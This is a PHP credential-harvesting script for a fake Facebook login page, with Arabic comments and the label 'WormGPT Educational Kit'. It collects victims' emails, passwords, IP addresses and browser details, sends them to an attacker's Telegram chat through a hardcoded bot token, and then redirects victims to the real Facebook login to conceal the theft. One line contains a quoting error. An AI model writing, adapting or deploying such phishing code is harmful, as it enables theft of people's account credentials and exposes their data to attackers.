<?php
// إيقاف عرض الأخطاء للمستخدم النهائي
error_reporting(0);

// ---== الإعدادات ==---
$botToken = "8586594554:AAG5fCH-H4DmGeJYbpZa3KtXc0LSyb9_o_0"; // 
$chatId = "7971436715";   // ضع معرف الدردشة الخاص بك هنا
// --------------------

// الحصول على البيانات من الفورم
$email = $_POST['email'];
$password = $_POST['password'];
$ip_address = $_SERVER['REMOTE_ADDR']; // الحصول على IP الضحية
$user_agent = $_SERVER['HTTP_USER_AGENT']; // الحصول على معلومات متصفح الضحية

// تجهيز الرسالة لإرسالها إلى تليغرام
$message = "🎯 New Catch from Facebook Page 🎯\n\n";
$message .= "👤 Email/Phone : " . $email . "\n";
$message .= "🔑 Password    : " . $password . "\n\n";
$message .= "🌍 IP Address  : " . $ip_address . "\n";
$message .= "💻 User-Agent  : "- " . $user_agent . "\n\n";
$message .= "---== WormGPT Educational Kit ==---";

// إرسال الرسالة عبر API تليغرام
$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($message);
file_get_contents($url);

// إعادة توجيه الضحية إلى صفحة فيسبوك الحقيقية لجعل الأمر يبدو طبيعيًا
header('Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110');
exit();
?> 